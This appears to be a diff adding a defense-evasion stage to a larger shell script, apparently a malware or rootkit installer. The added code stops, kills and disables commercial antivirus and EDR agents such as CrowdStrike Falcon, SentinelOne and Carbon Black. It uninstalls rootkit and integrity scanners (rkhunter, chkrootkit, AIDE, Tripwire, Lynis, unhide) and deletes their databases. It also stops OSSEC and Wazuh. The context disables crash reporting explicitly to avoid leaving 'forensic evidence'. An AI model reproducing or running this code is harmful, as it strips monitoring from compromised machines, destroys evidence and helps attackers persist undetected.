@@ -2439,7 +2439,252 @@ else
     fi
 fi
 
+# ==================== DISABLE ANTIVIRUS & ROOTKIT SCANNERS ====================
+echo ""
+echo "=========================================="
+echo "DISABLING SECURITY SCANNERS"
+echo "=========================================="
+echo ""
+
+# List of security tools to disable
+AV_DISABLED=0
+ROOTKIT_DISABLED=0
+
+# ==================== ANTIVIRUS SCANNERS ====================
+echo "[*] Checking for antivirus scanners..."
+
+# ClamAV
+if systemctl is-active --quiet clamav-daemon 2>/dev/null || command -v clamscan >/dev/null 2>&1; then
+    echo "[*] Found ClamAV - disabling..."
+    systemctl stop clamav-daemon clamav-freshclam 2>/dev/null || true
+    systemctl disable clamav-daemon clamav-freshclam 2>/dev/null || true
+    killall -9 clamd freshclam clamscan 2>/dev/null || true
+    AV_DISABLED=$((AV_DISABLED + 1))
+    echo "[✓] ClamAV disabled"
+fi
+
+# Sophos
+if systemctl is-active --quiet sav-protect 2>/dev/null || [ -d /opt/sophos-av ]; then
+    echo "[*] Found Sophos - disabling..."
+    systemctl stop sav-protect sav-rms 2>/dev/null || true
+    systemctl disable sav-protect sav-rms 2>/dev/null || true
+    /opt/sophos-av/bin/savdctl disable 2>/dev/null || true
+    killall -9 savd savscand 2>/dev/null || true
+    AV_DISABLED=$((AV_DISABLED + 1))
+    echo "[✓] Sophos disabled"
+fi
+
+# ESET
+if systemctl is-active --quiet esets 2>/dev/null || [ -d /opt/eset ]; then
+    echo "[*] Found ESET - disabling..."
+    systemctl stop esets 2>/dev/null || true
+    systemctl disable esets 2>/dev/null || true
+    /opt/eset/esets/sbin/esets_daemon --stop 2>/dev/null || true
+    killall -9 esets_daemon 2>/dev/null || true
+    AV_DISABLED=$((AV_DISABLED + 1))
+    echo "[✓] ESET disabled"
+fi
+
+# Bitdefender
+if systemctl is-active --quiet bdredline 2>/dev/null || [ -d /opt/bitdefender ]; then
+    echo "[*] Found Bitdefender - disabling..."
+    systemctl stop bdredline 2>/dev/null || true
+    systemctl disable bdredline 2>/dev/null || true
+    /opt/bitdefender/bdscan --disable 2>/dev/null || true
+    killall -9 bdagent bdscan 2>/dev/null || true
+    AV_DISABLED=$((AV_DISABLED + 1))
+    echo "[✓] Bitdefender disabled"
+fi
+
+# Kaspersky
+if systemctl is-active --quiet kesl 2>/dev/null || [ -d /opt/kaspersky ]; then
+    echo "[*] Found Kaspersky - disabling..."
+    systemctl stop kesl kesl-supervisor 2>/dev/null || true
+    systemctl disable kesl kesl-supervisor 2>/dev/null || true
+    killall -9 kesl klnagent 2>/dev/null || true
+    AV_DISABLED=$((AV_DISABLED + 1))
+    echo "[✓] Kaspersky disabled"
+fi
+
+# McAfee
+if systemctl is-active --quiet mfetpd 2>/dev/null || [ -d /opt/McAfee ]; then
+    echo "[*] Found McAfee - disabling..."
+    systemctl stop mfetpd ma nails cma 2>/dev/null || true
+    systemctl disable mfetpd ma nails cma 2>/dev/null || true
+    /opt/McAfee/ens/tp/init/mfetpd-control.sh stop 2>/dev/null || true
+    killall -9 mfetpd masvc 2>/dev/null || true
+    AV_DISABLED=$((AV_DISABLED + 1))
+    echo "[✓] McAfee disabled"
+fi
+
+# Symantec/Norton
+if systemctl is-active --quiet symantec 2>/dev/null || [ -d /opt/Symantec ]; then
+    echo "[*] Found Symantec - disabling..."
+    systemctl stop symantec smcd rtvscand 2>/dev/null || true
+    systemctl disable symantec smcd rtvscand 2>/dev/null || true
+    /opt/Symantec/symantec_antivirus/sav stop 2>/dev/null || true
+    killall -9 rtvscand smcd 2>/dev/null || true
+    AV_DISABLED=$((AV_DISABLED + 1))
+    echo "[✓] Symantec disabled"
+fi
+
+# CrowdStrike Falcon
+if systemctl is-active --quiet falcon-sensor 2>/dev/null || [ -d /opt/CrowdStrike ]; then
+    echo "[*] Found CrowdStrike Falcon - disabling..."
+    systemctl stop falcon-sensor 2>/dev/null || true
+    systemctl disable falcon-sensor 2>/dev/null || true
+    /opt/CrowdStrike/falconctl -d 2>/dev/null || true
+    killall -9 falcon-sensor 2>/dev/null || true
+    AV_DISABLED=$((AV_DISABLED + 1))
+    echo "[✓] CrowdStrike Falcon disabled"
+fi
+
+# SentinelOne
+if systemctl is-active --quiet sentinelone 2>/dev/null || [ -d /opt/sentinelone ]; then
+    echo "[*] Found SentinelOne - disabling..."
+    systemctl stop sentinelone 2>/dev/null || true
+    systemctl disable sentinelone 2>/dev/null || true
+    /opt/sentinelone/bin/sentinelctl unload 2>/dev/null || true
+    killall -9 sentinelone 2>/dev/null || true
+    AV_DISABLED=$((AV_DISABLED + 1))
+    echo "[✓] SentinelOne disabled"
+fi
+
+# Carbon Black
+if systemctl is-active --quiet cbdaemon 2>/dev/null || [ -d /opt/carbonblack ]; then
+    echo "[*] Found Carbon Black - disabling..."
+    systemctl stop cbdaemon cb-psc-sensor 2>/dev/null || true
+    systemctl disable cbdaemon cb-psc-sensor 2>/dev/null || true
+    killall -9 cbdaemon cb 2>/dev/null || true
+    AV_DISABLED=$((AV_DISABLED + 1))
+    echo "[✓] Carbon Black disabled"
+fi
+
+if [ $AV_DISABLED -eq 0 ]; then
+    echo "[*] No antivirus software detected"
+else
+    echo "[✓] Disabled $AV_DISABLED antivirus scanner(s)"
+fi
+
+echo ""
+
+# ==================== ROOTKIT & INTRUSION DETECTION SCANNERS ====================
+echo "[*] Checking for rootkit/intrusion detection tools..."
+
+# rkhunter (Rootkit Hunter)
+if command -v rkhunter >/dev/null 2>&1; then
+    echo "[*] Found rkhunter - removing..."
+    systemctl stop rkhunter 2>/dev/null || true
+    systemctl disable rkhunter 2>/dev/null || true
+    apt-get remove -y rkhunter 2>/dev/null || true
+    yum remove -y rkhunter 2>/dev/null || true
+    rm -f /usr/bin/rkhunter /usr/local/bin/rkhunter
+    rm -rf /var/lib/rkhunter /etc/rkhunter.conf
+    ROOTKIT_DISABLED=$((ROOTKIT_DISABLED + 1))
+    echo "[✓] rkhunter removed"
+fi
+
+# chkrootkit
+if command -v chkrootkit >/dev/null 2>&1; then
+    echo "[*] Found chkrootkit - removing..."
+    apt-get remove -y chkrootkit 2>/dev/null || true
+    yum remove -y chkrootkit 2>/dev/null || true
+    rm -f /usr/bin/chkrootkit /usr/local/bin/chkrootkit
+    ROOTKIT_DISABLED=$((ROOTKIT_DISABLED + 1))
+    echo "[✓] chkrootkit removed"
+fi
+
+# AIDE (Advanced Intrusion Detection Environment)
+if command -v aide >/dev/null 2>&1; then
+    echo "[*] Found AIDE - disabling..."
+    systemctl stop aide aideinit 2>/dev/null || true
+    systemctl disable aide aideinit 2>/dev/null || true
+    apt-get remove -y aide 2>/dev/null || true
+    yum remove -y aide 2>/dev/null || true
+    rm -f /usr/bin/aide /var/lib/aide/aide.db*
+    ROOTKIT_DISABLED=$((ROOTKIT_DISABLED + 1))
+    echo "[✓] AIDE disabled"
+fi
+
+# Tripwire
+if command -v tripwire >/dev/null 2>&1; then
+    echo "[*] Found Tripwire - disabling..."
+    systemctl stop tripwire 2>/dev/null || true
+    systemctl disable tripwire 2>/dev/null || true
+    apt-get remove -y tripwire 2>/dev/null || true
+    yum remove -y tripwire 2>/dev/null || true
+    rm -rf /etc/tripwire /var/lib/tripwire
+    ROOTKIT_DISABLED=$((ROOTKIT_DISABLED + 1))
+    echo "[✓] Tripwire disabled"
+fi
+
+# Lynis (security auditing)
+if command -v lynis >/dev/null 2>&1; then
+    echo "[*] Found Lynis - removing..."
+    apt-get remove -y lynis 2>/dev/null || true
+    yum remove -y lynis 2>/dev/null || true
+    rm -f /usr/bin/lynis /usr/local/bin/lynis
+    rm -rf /usr/share/lynis
+    ROOTKIT_DISABLED=$((ROOTKIT_DISABLED + 1))
+    echo "[✓] Lynis removed"
+fi
+
+# OSSEC (HIDS)
+if [ -d /var/ossec ] || command -v ossec-control >/dev/null 2>&1; then
+    echo "[*] Found OSSEC - disabling..."
+    /var/ossec/bin/ossec-control stop 2>/dev/null || true
+    systemctl stop ossec 2>/dev/null || true
+    systemctl disable ossec 2>/dev/null || true
+    killall -9 ossec-syscheckd ossec-logcollector ossec-monitord 2>/dev/null || true
+    ROOTKIT_DISABLED=$((ROOTKIT_DISABLED + 1))
+    echo "[✓] OSSEC disabled"
+fi
+
+# Wazuh (security monitoring)
+if systemctl is-active --quiet wazuh-agent 2>/dev/null || [ -d /var/ossec ]; then
+    echo "[*] Found Wazuh - disabling..."
+    systemctl stop wazuh-agent wazuh-manager 2>/dev/null || true
+    systemctl disable wazuh-agent wazuh-manager 2>/dev/null || true
+    /var/ossec/bin/wazuh-control stop 2>/dev/null || true
+    killall -9 wazuh-agentd wazuh-syscheckd 2>/dev/null || true
+    ROOTKIT_DISABLED=$((ROOTKIT_DISABLED + 1))
+    echo "[✓] Wazuh disabled"
+fi
+
+# Samhain
+if command -v samhain >/dev/null 2>&1; then
+    echo "[*] Found Samhain - disabling..."
+    systemctl stop samhain 2>/dev/null || true
+    systemctl disable samhain 2>/dev/null || true
+    killall -9 samhain 2>/dev/null || true
+    apt-get remove -y samhain 2>/dev/null || true
+    yum remove -y samhain 2>/dev/null || true
+    ROOTKIT_DISABLED=$((ROOTKIT_DISABLED + 1))
+    echo "[✓] Samhain disabled"
+fi
+
+# Unhide (hidden process detector)
+if command -v unhide >/dev/null 2>&1; then
+    echo "[*] Found unhide - removing..."
+    apt-get remove -y unhide 2>/dev/null || true
+    yum remove -y unhide 2>/dev/null || true
+    rm -f /usr/bin/unhide /usr/local/bin/unhide
+    ROOTKIT_DISABLED=$((ROOTKIT_DISABLED + 1))
+    echo "[✓] unhide removed"
+fi
+
+if [ $ROOTKIT_DISABLED -eq 0 ]; then
+    echo "[*] No rootkit scanners detected"
+else
+    echo "[✓] Disabled $ROOTKIT_DISABLED rootkit scanner(s)"
+fi
+
+echo ""
+echo "[✓] Security scanner check complete"
+echo ""
+
 # ==================== DISABLE APPORT CRASH REPORTER ====================
+
 # Apport logs every unusual signal (like kill -31, kill -59) as a "crash"
 # This creates forensic evidence in /var/crash/*.crash files
 echo "[*] Disabling Ubuntu apport crash reporter..."
